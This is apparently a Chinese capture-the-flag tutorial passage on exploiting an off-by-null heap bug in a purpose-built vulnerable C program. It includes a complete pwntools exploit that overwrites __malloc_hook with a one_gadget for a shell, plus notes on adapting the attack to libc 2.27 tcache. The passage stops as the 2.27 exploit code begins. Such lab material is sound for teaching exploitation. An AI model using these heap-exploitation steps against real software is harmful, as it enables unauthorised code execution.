+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;It&#39;s blank!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="o">=</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">;</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;content:&#34;</span><span class="p">);</span>
+	<span class="n">p</span><span class="p">[</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">,</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">size</span><span class="p">)]</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">delete</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Index?&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">index</span><span class="o">&gt;=</span><span class="mi">10</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;wrong index!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;It&#39;s blank!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">);</span>
+	<span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+	<span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">size</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;1) add a chunk&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;2) show content&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;3) edit a chunk&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;4) delete a chunk&#34;</span><span class="p">);</span>
+	<span class="n">putchar</span><span class="p">(</span><span class="sc">&#39;&gt;&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to my off by null vuln vulnerability exercise.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;wish you will play happy!&#34;</span><span class="p">);</span>
+	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">menu</span><span class="p">();</span>
+		<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
+		<span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+				<span class="n">add</span><span class="p">();</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+				<span class="n">show</span><span class="p">();</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+				<span class="n">edit</span><span class="p">();</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+				<span class="n">delete</span><span class="p">();</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="k">default</span><span class="o">:</span>
+				<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在edit函数出p[read(0,chunks[index].point,chunks[index].size)]=0;这句语句造成了off by null漏洞。本意是想将输入的最后一个字符替换成0，但是read函数返回的是读入的字符数，而数组是从0开始标记的，所以如果我们读入了size个字符那么就会修改第size+1处的值为0。</p>
+<p>我们用gcc -fPIE -pie -z now -o vuln off_by_one.c来开启全部保护。OK现在我们就开始写EXP了，按照我们上面介绍的利用思路，我们需要分配ABCD四个堆块，这里为了配合之后的fast bin attack，我们将B堆块的大小修改为0x70。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1">#A,0</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>	<span class="c1">#B,1</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span>	<span class="c1">#C,2</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#D,3</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/P2Lqb1CUwkxr5mu.png"
+        data-srcset="https://i.loli.net/2020/07/13/P2Lqb1CUwkxr5mu.png, https://i.loli.net/2020/07/13/P2Lqb1CUwkxr5mu.png 1.5x, https://i.loli.net/2020/07/13/P2Lqb1CUwkxr5mu.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/P2Lqb1CUwkxr5mu.png"
+        title="image-20200708222818883" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/MvJZ8dnycYWbVPQ.png"
+        data-srcset="https://i.loli.net/2020/07/13/MvJZ8dnycYWbVPQ.png, https://i.loli.net/2020/07/13/MvJZ8dnycYWbVPQ.png 1.5x, https://i.loli.net/2020/07/13/MvJZ8dnycYWbVPQ.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/MvJZ8dnycYWbVPQ.png"
+        title="image-20200708222923747" /></p>
+<p>图中表明了ABC三个堆块在堆中的相对位置，这里就不标记D了，因为D堆块只是起一个防止堆块和TOP chunk合并的作用，在漏洞利用时没有用处。</p>
+<p>OK我们继续之前分析的步骤，释放A堆块，并修改C堆块的prev_size和prev_inuse位，我们计算一下可以得到prev_size=0x70+0x90=0x100。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/Uk9nfaL1EHpXzxu.png"
+        data-srcset="https://i.loli.net/2020/07/13/Uk9nfaL1EHpXzxu.png, https://i.loli.net/2020/07/13/Uk9nfaL1EHpXzxu.png 1.5x, https://i.loli.net/2020/07/13/Uk9nfaL1EHpXzxu.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/Uk9nfaL1EHpXzxu.png"
+        title="image-20200708223415370" /></p>
+<p>A堆块被释放到了unsorted bin中，由图中红笔画出的两个地方，刚好可以bypass unlink的检验，下面我们再来看看C堆块的prev_size和prev_inuse位。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/nWAubjclxyZTKBI.png"
+        data-srcset="https://i.loli.net/2020/07/13/nWAubjclxyZTKBI.png, https://i.loli.net/2020/07/13/nWAubjclxyZTKBI.png 1.5x, https://i.loli.net/2020/07/13/nWAubjclxyZTKBI.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/nWAubjclxyZTKBI.png"
+        title="image-20200708224018145" /></p>
+<p>从图中可以看出，我们成功的将C堆块的prev_size和rev_inuse修改为我们想要的值，接下来让我们free掉C堆块，看看会发生什么。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/G1frQL9iKbqu6V5.png"
+        data-srcset="https://i.loli.net/2020/07/13/G1frQL9iKbqu6V5.png, https://i.loli.net/2020/07/13/G1frQL9iKbqu6V5.png 1.5x, https://i.loli.net/2020/07/13/G1frQL9iKbqu6V5.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/G1frQL9iKbqu6V5.png"
+        title="image-20200708224637108" /></p>
+<p>可以看到C堆块和前面的堆块发生合并生产了一个0x200大小的chunk，而B堆块被包含在其中，这个时候我们就实现了堆块overlapping。OK，off by null的漏洞我们以及利用成功了，接下来就是泄漏libc地址，然后进行fast bin attack袭击malloc_hook</p>
+<p>接下来的步骤我就直接阐述了，因为这不涉及off by null了。</p>
+<ul>
+<li>首先我们分配0x80大小的chunk这样，将会分割0x200的堆块，然后unsorted bin的地址就会放在我们B对堆块上。</li>
+<li>然后显示B堆块的内容，我们就获得了libc的地址</li>
+<li>然后再添加0x68大小的chunk，这样我们就拥有两个Bchunk，随后就可以展开fast bin attack。</li>
+<li>我们再释放掉其中一个B堆块</li>
+<li>再用另外一个堆块修改fd的值为malloc_hook-0x23</li>
+<li>最后修改malloc_hook为realloc，realloc_hook为onegadget从而获得shell</li>
+</ul>
+<p>下面是EXP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#Author: Nopnoping</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">()</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">s</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> 
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sea</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span>          <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+<span class="n">info_addr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">tag</span><span class="p">,</span> <span class="n">addr</span>        <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">tag</span> <span class="o">+</span><span class="s1">&#39;: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">gdba</span>	<span class="o">=</span> <span class="k">lambda</span> <span class="n">command</span><span class="o">=</span><span class="s1">&#39;&#39;</span>			<span class="p">:</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span><span class="n">command</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">elect</span><span class="p">):</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elect</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">full</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">full</span><span class="p">:</span>
+		<span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1">#A,0</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>	<span class="c1">#B,1</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span>	<span class="c1">#C,2</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#D,3</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x60</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">),</span><span class="n">full</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c4b78</span>
+<span class="n">malloc_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+<span class="n">realloc</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;realloc&#39;</span><span class="p">]</span>
+<span class="n">gadget</span><span class="o">=</span><span class="p">[</span><span class="mh">0x4527a</span><span class="p">,</span><span class="mh">0xf0364</span><span class="p">,</span><span class="mh">0xf1207</span><span class="p">]</span>
+<span class="n">onegadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">gadget</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s1">&#39;libc_base&#39;</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;malloc_hook&#34;</span><span class="p">,</span><span class="n">malloc_hook</span><span class="p">)</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;onegadget&#34;</span><span class="p">,</span><span class="n">onegadget</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0xb</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">realloc</span><span class="o">+</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="libc227的利用">libc2.27的利用</h1>
+<p>libc2.27的利用和libc2.23基本思路是一样的，只不过我们需要多一步填满tcache的操作。这里还是用2.23里面的ABCD四个堆块解释。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png"
+        data-srcset="https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png, https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png 1.5x, https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png"
+        title="image-20200706225142650" /></p>
+<p>我们的A堆块需要释放到unsorted bin中，如果0x90大小的tcache没有填满的话，其会释放到他cache中，而无法绕过unlink检验。</p>
+<p>C堆块的tcache如果不填满的话，当我们释放C堆块时，其也会直接放入tcache中，而不会发生向后合并的操作。</p>
+<p>因此根据上面的分析，我们需要将0x90和0x100的tcache提前填充满。</p>
+<p>这里还有一点需要注意，在2.27中我们可以使用tcache_poisoning来达到任意地址分配，因此我们的B堆块不需要像在2.23中构造成0x70。OK这里综述一下利用思路。</p>
+<ul>
+<li>填满0x90和0xf0堆块</li>
+<li>申请ABCD四个堆块</li>
+<li>释放A堆块</li>
+<li>利用B堆块修改C堆块的的prev_size和prev_inuse位</li>
+<li>释放C堆块</li>
+</ul>
+<p>OK，off by null我们就实施成功了，实现了chunk overlapping，后面的任意地址分配就需要利用tcache_poisoning了。</p>
+<h2 id="例题-1">例题</h2>
+<p>我们还是利用2.23的程序来练习2.27版本下的利用。这里因为我是在ubuntu16系统下运行的程序，其默认版本是libc2.23，因此我需要更改一下程序的libc版本。需要用到的工具是patchelf，在这篇博客我有对这个工具详细的一个介绍。修改程序为指定libc版本 &amp; pwndbg安装。如果用的是ubuntu18的朋友可以直接跳到EXP编写的部分。</p>
+<p>我们先用ldd看一下这个程序的libc和ld。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/pRlqhC7UifOjEwB.png"
+        data-srcset="https://i.loli.net/2020/07/13/pRlqhC7UifOjEwB.png, https://i.loli.net/2020/07/13/pRlqhC7UifOjEwB.png 1.5x, https://i.loli.net/2020/07/13/pRlqhC7UifOjEwB.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/pRlqhC7UifOjEwB.png"
+        title="image-20200710215557835" /></p>
+<p>可以看到程序的libc版本和ld依赖的文件，我们现在利用patchelf工具将其修改为2.27的libc和ld。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ patchelf --replace-needed  libc.so.6 /glibc/2.27/amd64/lib/libc-2.27.so vuln
+$ patchelf --set-interpreter /glibc/2.27/amd64/lib/ld-2.27.so ./vuln
+$ ldd ldd vuln
+	linux-vdso.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x00007ffd38345000<span class="o">)</span>
+	/glibc/2.27/amd64/lib/libc-2.27.so <span class="o">(</span>0x00007fcf76185000<span class="o">)</span>
+	/glibc/2.27/amd64/lib/ld-2.27.so <span class="o">=</span>&gt; /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007fcf7673d000<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>用patchelf工具修改后，我们再次用ldd查看程序，libc和ld成功被我们修改为2.27。</p>
+<p>OK现在我们可以开始编，写我们的EXP了。按照前面分析的思路，我们首先需要将0x90和0x1b0两个堆块填满。当tcache被填满后再申请堆块的话，将会从tcahe里面分配，这样分配到的ABC可能并不连续，所以我们先提前将ABC三个堆块分配好，再填满0x90和0x1b。因为又tcache来分隔C堆块和TOP chunk，所以这里我们就不需要D堆块了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
